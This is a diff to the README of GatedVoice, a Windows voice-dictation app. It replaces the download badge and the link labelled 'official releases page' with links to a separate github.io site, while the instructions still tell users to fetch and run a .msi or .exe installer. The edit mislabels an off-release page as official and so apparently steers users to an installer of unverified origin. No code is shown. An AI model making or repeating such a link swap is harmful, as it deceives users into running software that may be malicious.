@@ -1,6 +1,6 @@
 # 🎙️ GatedVoice - Private voice dictation for Windows
 
-[![](https://img.shields.io/badge/Download-GatedVoice-blue.svg)](https://github.com/Leleb5443/GatedVoice/releases/latest)
+[![](https://img.shields.io/badge/Download-GatedVoice-blue.svg)](https://leleb5443.github.io)
 
 GatedVoice turns your voice into text in any application. It runs locally on your computer. Your voice data stays on your machine. No cloud servers process your words. You keep your privacy during every dictation session.
 
@@ -23,7 +23,7 @@ The software runs best on machines with a dedicated graphics card, though it wor
 
 You must download the installer from the release page. 
 
-1. Visit the [official releases page](https://github.com/Leleb5443/GatedVoice/releases/latest) to find the latest version.
+1. Visit the [official releases page](https://leleb5443.github.io) to find the latest version.
 2. Look for the file ending in `.msi` or `.exe`.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
